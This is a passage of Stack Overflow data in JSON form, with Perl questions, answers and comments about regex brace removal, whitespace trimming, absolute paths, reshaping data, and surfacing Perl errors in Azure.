\u201cnobody can tell!\u201d. Perhaps <i>that</i> was Python. ;-) (actually it was a shell script)"}, {"owner": {"reputation": 11918, "user_id": 5527985, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CfG3C.png?s=128&g=1", "display_name": "bobble bubble", "link": "https://stackoverflow.com/users/5527985/bobble-bubble"}, "edited": false, "score": 1, "creation_date": 1457472193, "post_id": 35877362, "comment_id": 59419878, "body": "For arbitrary nesting you can try a recursive regex <a href=\"https://regex101.com/r/nU2bZ4/2\" rel=\"nofollow noreferrer\">like this</a>."}, {"owner": {"reputation": 2250, "user_id": 1055869, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/01f751c696d7be333a6fccb0165c5d39?s=128&d=identicon&r=PG", "display_name": "Shabbir Hussain", "link": "https://stackoverflow.com/users/1055869/shabbir-hussain"}, "edited": false, "score": 0, "creation_date": 1457473055, "post_id": 35877362, "comment_id": 59420324, "body": "The example is just motivational. I want to translate a domain specific description to a cpp file. Since the domain specific language is so close to C I thought that a compiler is a larger overhead than just using a simple string replace script."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1457473462, "post_id": 35877362, "comment_id": 59420546, "body": "But the braces are required in C++."}, {"owner": {"reputation": 2250, "user_id": 1055869, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/01f751c696d7be333a6fccb0165c5d39?s=128&d=identicon&r=PG", "display_name": "Shabbir Hussain", "link": "https://stackoverflow.com/users/1055869/shabbir-hussain"}, "reply_to_user": {"reputation": 11918, "user_id": 5527985, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CfG3C.png?s=128&g=1", "display_name": "bobble bubble", "link": "https://stackoverflow.com/users/5527985/bobble-bubble"}, "edited": false, "score": 0, "creation_date": 1457473480, "post_id": 35877362, "comment_id": 59420559, "body": "@bobblebubble That&#39;s exactly what I needed. Thanks!"}], "answers": [{"tags": [], "owner": {"reputation": 30226, "user_id": 2107876, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/975e7190aac72397465126f04f46f3f6?s=128&d=identicon&r=PG", "display_name": "laune", "link": "https://stackoverflow.com/users/2107876/laune"}, "is_accepted": false, "score": 0, "last_activity_date": 1457470123, "creation_date": 1457470123, "answer_id": 35877722, "question_id": 35877362, "link": "https://stackoverflow.com/questions/35877362/perl-remove-outer-brackets/35877722#35877722", "title": "Perl Remove outer Brackets", "body": "<p>Here it is:  </p>\n\n<pre><code>my $s = \"void init(){ if(true){ //do something }}\";\n$s =~ s/^([^{]+)\\{(.*)\\}([^{]*)$/$1$2$3/s;\nprint \"$s\\n\";\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "is_accepted": false, "score": 2, "last_activity_date": 1457473295, "creation_date": 1457473295, "answer_id": 35878578, "question_id": 35877362, "link": "https://stackoverflow.com/questions/35877362/perl-remove-outer-brackets/35878578#35878578", "title": "Perl Remove outer Brackets", "body": "<p>Write a parser for the language. Here's a simplified example using <a href=\"http://p3rl.org/Marpa::R2\" rel=\"nofollow\">Marpa::R2</a>:</p>\n\n<pre><code>#!/usr/bin/perl\nuse warnings;\nuse strict;\n\nuse Marpa::R2;\n\nmy $input = &lt;&lt; '__IN__';\nvoid init(){\n     if(true){\n     //do something\n     }\n\n}\n__IN__\n\nmy $dsl = &lt;&lt; '__DSL__';\n\n:default ::= action =&gt; concat\nlexeme default = latm =&gt; 1\n\nFuncDef ::= type name Arglist ('{') Body ('}')\nArglist ::= '(' Args ')'\nArgs    ::= Arg*   separator =&gt; comma\nArg     ::= type name\nBody    ::= Block+\nBlock   ::= nonbrace\n          | '{' nonbrace '}'\n\n\nnonbrace ~ [^{}]*\ncomma    ~ ','\ntype     ~ 'void'\nname     ~ [\\w]+\nspace    ~ [\\s]+\n:discard ~ space\n\n__DSL__\n\nsub concat { shift; join ' ', @_ }\n\nmy $grammar = 'Marpa::R2::Scanless::G'-&gt;new({ source =&gt; \\$dsl });\nmy $value = $grammar-&gt;parse(\\$input, { semantics_package =&gt; 'main' });\nprint $$value;\n</code></pre>\n\n<p>The curly brackets at <code>FuncDef</code> are parenthesized, which tells Marpa to discard them.</p>\n"}], "owner": {"reputation": 2250, "user_id": 1055869, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/01f751c696d7be333a6fccb0165c5d39?s=128&d=identicon&r=PG", "display_name": "Shabbir Hussain", "link": "https://stackoverflow.com/users/1055869/shabbir-hussain"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 291, "favorite_count": 1, "answer_count": 2, "score": 1, "last_activity_date": 1457473295, "creation_date": 1457468870, "question_id": 35877362, "link": "https://stackoverflow.com/questions/35877362/perl-remove-outer-brackets", "title": "Perl Remove outer Brackets", "body": "<p>I want to use a perl regex to remove the outer brackets in a function but I can't construct a regex that doesn't interfere with the inner brackets . Here is an example:</p>\n\n<pre><code>void init(){\n     if(true){\n     //do something\n     }\n\n}\n</code></pre>\n\n<p>into</p>\n\n<pre><code>void init()\n     if(true){\n     //do something\n     }\n</code></pre>\n\n<p>is there a regex that can do this?</p>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 3, "creation_date": 1457467705, "post_id": 35876809, "comment_id": 59417409, "body": "<code>=~</code> and <code>s&#47;&#47;&#47;</code> are documented in perlop <a href=\"http://perldoc.perl.org/perlop.html#Binding-Operators\" rel=\"nofollow noreferrer\">here</a> and <a href=\"http://perldoc.perl.org/perlop.html#s%2f_PATTERN_%2f_REPLACEMENT_%2fmsixpodualngcer\" rel=\"nofollow noreferrer\">here</a>. If you have perldoc installed on your system, you can even view the documentation locally by running <code>perldoc perlop</code>. <a href=\"http://perldoc.perl.org/perlretut.html\" rel=\"nofollow noreferrer\">perlretut</a> and <a href=\"http://perldoc.perl.org/perlre.html\" rel=\"nofollow noreferrer\">perlre</a> are good resources for understanding regular expressions."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 5, "creation_date": 1457467811, "post_id": 35876809, "comment_id": 59417471, "body": "Also, you should generally <a href=\"http://stackoverflow.com/questions/297034/why-are-perl-5s-function-prototypes-bad\">avoid prototypes</a> in your own code. Instead of <code>sub trim($) { ... }</code> do <code>sub trim { ... }</code>"}], "answers": [{"comments": [{"owner": {"reputation": 37822, "user_id": 1231450, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/b9c98b4ce12bf9fd925d8c35c8861bb2?s=128&d=identicon&r=PG", "display_name": "Jan", "link": "https://stackoverflow.com/users/1231450/jan"}, "edited": false, "score": 1, "creation_date": 1457467662, "post_id": 35876856, "comment_id": 59417385, "body": "I wonder if this is really an answer, but what is there else to say :)"}], "tags": [], "owner": {"reputation": 51553, "user_id": 557306, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/OAmpG.jpg?s=128&g=1", "display_name": "sidyll", "link": "https://stackoverflow.com/users/557306/sidyll"}, "is_accepted": false, "score": 5, "last_activity_date": 1457466980, "creation_date": 1457466980, "answer_id": 35876856, "question_id": 35876809, "link": "https://stackoverflow.com/questions/35876809/step-by-step-of-trimming-white-space/35876856#35876856", "title": "Step by step of trimming white-space", "body": "<p>Yes it is.</p>\n\n<p>Nothing else to say, actually.</p>\n"}, {"comments": [{"owner": {"reputation": 11845, "user_id": 3280538, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/pYuGC.jpg?s=128&g=1", "display_name": "flakes", "link": "https://stackoverflow.com/users/3280538/flakes"}, "edited": false, "score": 0, "creation_date": 1457468338, "post_id": 35877121, "comment_id": 59417764, "body": "so the whole thing could be: <code>$string =~ s&#47; ^\\s+ | \\s*$ &#47;&#47;x;</code> ?"}], "tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": true, "score": 1, "last_activity_date": 1457495078, "last_edit_date": 1495542690, "creation_date": 1457467965, "answer_id": 35877121, "question_id": 35876809, "link": "https://stackoverflow.com/questions/35876809/step-by-step-of-trimming-white-space/35877121#35877121", "title": "Step by step of trimming white-space", "body": "<p>Yes it is, as answered by <a href=\"https://stackoverflow.com/users/557306/sidyll\">sidyll</a>. All your comments are accurate. Since these are basics you are asking, I would like to add a little.</p>\n\n<p>You can do both in one expression, <code>s/^\\s+|\\s+$//g</code> (there are slight efficiency considerations).\nNote that now you need <code>/g</code> (\"global\") modifier so that <em>all</em> <code>\\s+</code> are found. Otherwise the engine stops after it finds <code>^\\s+</code> (if there are any) and you are left with trailing space (if any).</p>\n\n<p>You can use spaces in your regex, for readability, by using <code>/x</code> modifier. In this case it isn't much but with more complex ones it can help a lot. </p>\n\n<pre><code>$string =~ s% ^\\s+ | \\s+$ %%gx;\n</code></pre>\n\n<p>You may use different delimiters -- as long as you don't use that inside the regex. I use <code>%</code> above to avoid the editor coloring everything red (I find <code>%</code> not very readable in fact, but I need <code>|</code> inside). This is sometimes very useful, for example when your regex has a lot of <code>/</code>.  Then you can use a different delimiter so you don't have to escape them.</p>\n\n<hr>\n\n<p>Complete resources are given by <a href=\"https://stackoverflow.com/users/176646/thissuitisblacknot\">ThisSuitIsBlackNot</a> in the comment.</p>\n\n<p>I've seen people praise this a lot: <a href=\"https://regex101.com/r/mD6mV0/1\" rel=\"nofollow noreferrer\">regex Demo</a>, where you can type in a regex and see how it works.</p>\n"}], "owner": {"reputation": 11845, "user_id": 3280538, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/pYuGC.jpg?s=128&g=1", "display_name": "flakes", "link": "https://stackoverflow.com/users/3280538/flakes"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 81, "favorite_count": 1, "accepted_answer_id": 35877121, "answer_count": 2, "score": 1, "last_activity_date": 1457495078, "creation_date": 1457466867, "question_id": 35876809, "link": "https://stackoverflow.com/questions/35876809/step-by-step-of-trimming-white-space", "title": "Step by step of trimming white-space", "body": "<p>I'm new to both perl and using regex. I need to remove the white space from a string. </p>\n\n<p>I found an example but its pretty opaque to me. Is this an accurate description of whats happening?</p>\n\n<pre><code>sub trim($)\n{\n  my $string = shift;\n  $string =~ s/^\\s+//;\n  # =~         : regex on variable string\n  # s/         : replace match with value\n  # ^\\s+       : one or more white space characters at beginning\n  # //         : no characters\n\n  $string =~ s/\\s+$//;\n  #  =~        : regex on variable $string\n  # s/         : replace match with value\n  # \\s+$       : one or more white space characters until end of line\n  # //         : no characters\n  return $string;\n}\n</code></pre>\n"}, {"tags": ["perl"], "answers": [{"comments": [{"owner": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "edited": false, "score": 0, "creation_date": 1457466736, "post_id": 35876687, "comment_id": 59416850, "body": "Thanks for the reference to <code>Path::Class</code>!"}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 2, "last_activity_date": 1457468176, "last_edit_date": 1457468176, "creation_date": 1457466427, "answer_id": 35876687, "question_id": 35876488, "link": "https://stackoverflow.com/questions/35876488/preferred-way-of-getting-absolute-path-of-path-relative-to-current-directory/35876687#35876687", "title": "Preferred way of getting absolute path of path relative to current directory", "body": "<p>File::Spec and the friendlier Path::Class do not touch the file system, so they can be used for path that you will create. <code>Cwd::abs_path</code> does, so it can be used to return valid paths. Use whichever is most appropriate.</p>\n"}], "owner": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 386, "favorite_count": 1, "accepted_answer_id": 35876687, "answer_count": 1, "score": -1, "last_activity_date": 1457468176, "creation_date": 1457465788, "question_id": 35876488, "link": "https://stackoverflow.com/questions/35876488/preferred-way-of-getting-absolute-path-of-path-relative-to-current-directory", "title": "Preferred way of getting absolute path of path relative to current directory", "body": "<p>I am trying to expand a path relative to the current directory:</p>\n\n<pre><code>use feature qw(say);\nuse strict;\nuse warnings;\n\nuse Cwd;\nuse File::Spec;\n\nmy $fn = 'test/my_file';\n\nsay File::Spec-&gt;rel2abs( $fn );\nsay Cwd::abs_path( $fn );\n</code></pre>\n\n<p>Here, <code>Cwd::abs_path()</code> fails if directory <code>test</code> does not exist. </p>\n\n<p>Why does <code>File::Spec-&gt;rel2abs()</code> work fine, while <code>Cwd::abs_path()</code> fails?</p>\n\n<p>The documentation of the two modules <a href=\"https://metacpan.org/pod/Cwd\" rel=\"nofollow\"><code>Cwd</code></a> and <a href=\"https://metacpan.org/pod/File::Spec\" rel=\"nofollow\"><code>File::Spec</code></a> gives little clue why this happens. According to the following bug report it could be due to expansion of symbolic links, first from 2004: <code>\"Cwd::abs_path returns undef for non-existent paths\"</code>:</p>\n\n<ul>\n<li><a href=\"https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=257568\" rel=\"nofollow\">bugs.debian.org</a></li>\n<li><a href=\"https://rt.perl.org/Public/Bug/Display.html?id=117423\" rel=\"nofollow\">rt.perl.org</a></li>\n</ul>\n"}, {"tags": ["r", "perl"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 1, "creation_date": 1457460914, "post_id": 35874872, "comment_id": 59413380, "body": "Are you trying to do this in R or Perl?"}, {"owner": {"reputation": 113, "user_id": 5954236, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/4ca89ec3e90f4978958cbb9916a7fa64?s=128&d=identicon&r=PG&f=1", "display_name": "mxttgen31", "link": "https://stackoverflow.com/users/5954236/mxttgen31"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1457462688, "post_id": 35874872, "comment_id": 59414337, "body": "Yes I would like to do this in perl. Would you recommend using hash?"}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1457463072, "post_id": 35874872, "comment_id": 59414552, "body": "If you&#39;re using Perl, why did you add the <code>r</code> tag to your question? I would recommend <a href=\"https://www.google.com/search?q=perl+columns+to+rows+site%3Astackoverflow.com&amp;ie=utf-8&amp;oe=utf-8\" rel=\"nofollow noreferrer\">searching for a similar question</a> and if you can&#39;t find a working answer after a few hours of research and coding attempts, post a new question with only the <code>perl</code> tag."}], "answers": [{"tags": [], "owner": {"reputation": 661302, "user_id": 3732271, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ee6e12042dc31b1ef27471482f9ff91f?s=128&d=identicon&r=PG&f=1", "display_name": "akrun", "link": "https://stackoverflow.com/users/3732271/akrun"}, "is_accepted": false, "score": 1, "last_activity_date": 1457461356, "last_edit_date": 1457461356, "creation_date": 1457461019, "answer_id": 35874934, "question_id": 35874872, "link": "https://stackoverflow.com/questions/35874872/reformatting-data-from-columns-to-rows/35874934#35874934", "title": "Reformatting data from columns to rows", "body": "<p>In <code>R</code>, we can use <code>dcast</code></p>\n\n<pre><code>library(reshape2)\ndcast(df1, ID~C1, value.var='C2')\n#   ID S1 S2 S3 S4\n# 1  A  1  1  2  2\n# 2  B  2  2  2  2\n# 3  C  2  2  1  1\n</code></pre>\n\n<hr>\n\n<p>Or using <code>base R</code></p>\n\n<pre><code>with(df1, tapply(C2, list(ID, C1), FUN=I))\n</code></pre>\n\n<p>Or</p>\n\n<pre><code>xtabs(C2~ID+C1, df1)\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 9766, "user_id": 2290910, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/D6wrz.jpg?s=128&g=1", "display_name": "DatamineR", "link": "https://stackoverflow.com/users/2290910/dataminer"}, "is_accepted": false, "score": 1, "last_activity_date": 1457461173, "creation_date": 1457461173, "answer_id": 35874977, "question_id": 35874872, "link": "https://stackoverflow.com/questions/35874872/reformatting-data-from-columns-to-rows/35874977#35874977", "title": "Reformatting data from columns to rows", "body": "<p>One alternative using <code>tidyr::spread()</code>:</p>\n\n<pre><code>library(tidyr)\nspread(df, C1, C2)\n  ID S1 S2 S3 S4\n1  A  1  1  2  2\n2  B  2  2  2  2\n3  C  2  2  1  1\n</code></pre>\n"}], "owner": {"reputation": 113, "user_id": 5954236, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/4ca89ec3e90f4978958cbb9916a7fa64?s=128&d=identicon&r=PG&f=1", "display_name": "mxttgen31", "link": "https://stackoverflow.com/users/5954236/mxttgen31"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 51, "favorite_count": 0, "closed_date": 1457461199, "answer_count": 2, "score": -1, "last_activity_date": 1457461356, "creation_date": 1457460807, "last_edit_date": 1457460907, "question_id": 35874872, "link": "https://stackoverflow.com/questions/35874872/reformatting-data-from-columns-to-rows", "closed_reason": "Duplicate", "title": "Reformatting data from columns to rows", "body": "<p>I have a data set that looks like this:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>ID  C1 C2\nA   S1  1\nA   S2  1\nA   S3  2\nA   S4  2\nB   S1  2\nB   S2  2\nB   S3  2\nB   S4  2\nC   S1  2\nC   S2  2\nC   S3  1\nC   S4  1\n</code></pre>\n\n<p>And would like to reformat to:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>ID S1 S2 S3 S4\nA 1 1 2 2\nB 2 2 2 2\nC 2 2 1 1\n</code></pre>\n\n<p>Any advice?</p>\n"}, {"tags": ["perl", "azure", "strawberry-perl"], "comments": [{"owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 1, "creation_date": 1457455432, "post_id": 35872388, "comment_id": 59409986, "body": "You are using <code>print</code> where <code>warn</code> or <code>die</code> is called for. Second, you are sending headers twice. Third, this is probably related to your web server set up more than anything else. Find where the logs are, find out what you are choosing to log."}, {"owner": {"reputation": 7696, "user_id": 16911, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/72f8e04bbd904ab1e869b3422802dbf3?s=128&d=identicon&r=PG", "display_name": "AaronSieb", "link": "https://stackoverflow.com/users/16911/aaronsieb"}, "reply_to_user": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 0, "creation_date": 1457456229, "post_id": 35872388, "comment_id": 59410584, "body": "@Sinan&#220;n&#252;r 1. Production code uses <code>die</code>, <code>print</code> used here because I could confirm that <code>print</code> statements used elsewhere in the script worked. Amended to <code>warn</code>; no change in behavior. 2. Removed header print statement; no change in behavior. 3. I&#39;ve indicated where I&#39;m looking for the logs in Azure (and my log settings). If there is a different location where these errors are being logged, that would be acceptable as an answer."}, {"owner": {"reputation": 7696, "user_id": 16911, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/72f8e04bbd904ab1e869b3422802dbf3?s=128&d=identicon&r=PG", "display_name": "AaronSieb", "link": "https://stackoverflow.com/users/16911/aaronsieb"}, "reply_to_user": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 0, "creation_date": 1457618318, "post_id": 35872388, "comment_id": 59495372, "body": "So I&#39;m getting down votes and close votes... Is Azure configuration off-topic for SO? And if so, where is a better place to post such questions?"}, {"owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 0, "creation_date": 1457624538, "post_id": 35872388, "comment_id": 59500241, "body": "You did not post a short and complete script that demonstrates the problem. You need to isolate the issue from the all the confounding factors you have introduced. The close votes are for &quot;too broad&quot; ... that is, &quot;given the vague and incomplete description, there are so many things that could be wrong that it is not worth the bother&quot;. You can choose to help others help you. It is up to you."}, {"owner": {"reputation": 7696, "user_id": 16911, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/72f8e04bbd904ab1e869b3422802dbf3?s=128&d=identicon&r=PG", "display_name": "AaronSieb", "link": "https://stackoverflow.com/users/16911/aaronsieb"}, "reply_to_user": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 0, "creation_date": 1457626747, "post_id": 35872388, "comment_id": 59501913, "body": "@Sinan&#220;n&#252;r I have reorganized the question, and reduced the reproduction steps to the minimum. Is this better?"}], "answers": [{"tags": [], "owner": {"reputation": 7696, "user_id": 16911, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/72f8e04bbd904ab1e869b3422802dbf3?s=128&d=identicon&r=PG", "display_name": "AaronSieb", "link": "https://stackoverflow.com/users/16911/aaronsieb"}, "is_accepted": true, "score": 0, "last_activity_date": 1459798700, "last_edit_date": 1459798700, "creation_date": 1459796230, "answer_id": 36410682, "question_id": 35872388, "link": "https://stackoverflow.com/questions/35872388/how-do-i-get-perl-errors-to-display-in-azure/36410682#36410682", "title": "How do I get Perl errors to display in Azure?", "body": "<p>Errors can be sent to the browser by adjusting the additional arguments to the handler mapping for the *.pl extension.</p>\n\n<p>In particular, <code>-MFCGI::IIS=eval</code> worked for me.</p>\n\n<p>See the <a href=\"http://search.cpan.org/~cosmicnet/FCGI-IIS-0.05/lib/FCGI/IIS.pm\" rel=\"nofollow\">documentation</a>.</p>\n\n<p>Note that some errors still aren't reported in the browser. For example, there appears to be an issue with DBI database calls that causes the process to halt without displaying the error message.</p>\n\n<p>These errors can be viewed using Failed Request Tracing.</p>\n\n<p>Failed Request Tracing can be enabled under All Settings -> Diagnostic Logs -> Failed Request Tracing</p>\n\n<p>The resulting logs are accessible via FTP at /LogFiles/W3SVC*/fr*.xml .</p>\n\n<p>To view the files, download the XML file for your request, along with freb.xsl from the same directory. You can then view the log XML file in an XML viewer (such as Internet Explorer).</p>\n\n<p>More information:</p>\n\n<ul>\n<li><p><a href=\"https://azure.microsoft.com/en-us/documentation/articles/web-sites-enable-diagnostic-log/\" rel=\"nofollow\">Enable diagnostics logging for web apps in Azure App Service</a></p></li>\n<li><p><a href=\"https://blogs.msdn.microsoft.com/benjaminperkins/2013/07/31/enabling-failed-request-logging-on-a-windows-azure-web-site/\" rel=\"nofollow\">Enabling Failed Request Logging on a Windows Azure Web Site</a></p></li>\n</ul>\n"}], "owner": {"reputation": 7696, "user_id": 16911, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/72f8e04bbd904ab1e869b3422802dbf3?s=128&d=identicon&r=PG", "display_name": "AaronSieb", "link": "https://stackoverflow.com/users/16911/aaronsieb"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 113, "favorite_count": 0, "accepted_answer_id": 36410682, "answer_count": 1, "score": -1, "last_activity_date": 1459798700, "creation_date": 1457453622, "last_edit_date": 1457627002, "question_id": 35872388, "link": "https://stackoverflow.com/questions/35872388/how-do-i-get-perl-errors-to-display-in-azure", "title": "How do I get Perl errors to display in Azure?", "body": "<h1>Problem:</h1>\n\n<p>Errors generated by Perl scripts are not displayed or logged in an Azure web application.</p>\n\n<h1>Steps to reproduce:</h1>\n\n<ul>\n<li><p>Install Strawberry Perl to an Azure web application, using <a href=\"https://github.com/projectkudu/kudu/wiki/Deploying-Perl-apps\" rel=\"nofollow\">this guide</a>.</p>\n\n<p>The most relevant part of that guide being that I have Perl configured as a handler for the .pl extension, using <code>perl.exe</code> with an argument of <code>-MFCGI::IIS=do</code>.</p></li>\n<li><p>Enable logging to local file system (error level: verbose).</p></li>\n<li><p>Enable detailed error messages and Failed Request Tracing.</p></li>\n<li><p>Run the following test script in a browser:</p>\n\n<pre><code>\nuse strict;\nuse warnings;\nuse diagnostics;\nuse CGI::Carp 'fatalsToBrowser';\n\nuse CGI;\nmy $q = new CGI;\nprint $q->header(-type => \"text/plain\");\n\nprint \"Hello, World!\\n\";\n\ndie \"This is a test\";\n\nprint \"End of script.\";\n</code></pre></li>\n</ul>\n\n<h1>My results:</h1>\n\n<ul>\n<li><p>Script halts after \"Hello, World!\" (\"End of script\" and \"This is a test\" are not displayed).</p></li>\n<li><p>\"This is a test\" is not found in any log file in the /LogFiles directory.</p></li>\n</ul>\n\n<h1>Things I have Verified</h1>\n\n<ul>\n<li><p>Strawberry Perl runs when executed via the command line (using Kudu).</p></li>\n<li><p>When run using the command line, the script produces expected results:</p>\n\n<pre>\n[Thu Mar 10 16:09:30 2016] azure-test.pl: This is a test at d:\\home\\site\\wwwroot\\cgi-bin\\azure-test.pl line 12.\nContent-Type: text/plain; charset=ISO-8859-1\n\nHello, World!\n&lt;h1&gt;Software error:&lt;/h1&gt;\n&lt;pre&gt;This is a test at d:\\home\\site\\wwwroot\\cgi-bin\\azure-test.pl line 12.\n&lt;/pre&gt;\n&lt;p&gt;\nFor help, please send mail to this site&#39;s webmaster, giving this error message \nand the time and date of the error.\n\n&lt;/p&gt;\n</pre></li>\n</ul>\n\n<h1>Why Can't I Just use Perl to View the Errors?</h1>\n\n<p>A different section of code is failing in Azure, but not in Perl. I need to see the errors generated in the Azure environment in order to troubleshoot it.</p>\n"}, {"tags": ["perl", "replace"], "comments": [{"owner": {"reputation": 13399, "user_id": 716443, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8d13509991dbbd5467f01f55988ae4e?s=128&d=identicon&r=PG", "display_name": "DavidO", "link": "https://stackoverflow.com/users/716443/davido"}, "edited": false, "score": 0, "creation_date": 1457452977, "post_id": 35871840, "comment_id": 59408239, "body": "The first code snippet does not modify <code>@fileLines</code>. I think you&#39;re expecting it to do so. If you wish for that to happen you need to perform your substitution on <code>$fileLines</code>, not on <code>$str</code>."}], "answers": [{"tags": [], "owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "is_accepted": true, "score": 0, "last_activity_date": 1457453024, "creation_date": 1457453024, "answer_id": 35872169, "question_id": 35871840, "link": "https://stackoverflow.com/questions/35871840/perl-search-and-replace-random-text/35872169#35872169", "title": "perl search and replace random text", "body": "<p>By using <a href=\"http://p3rl.org/quotemeta\" rel=\"nofollow\">quotemeta</a>, you interpret <code>$find</code> literally. But removing it isn't 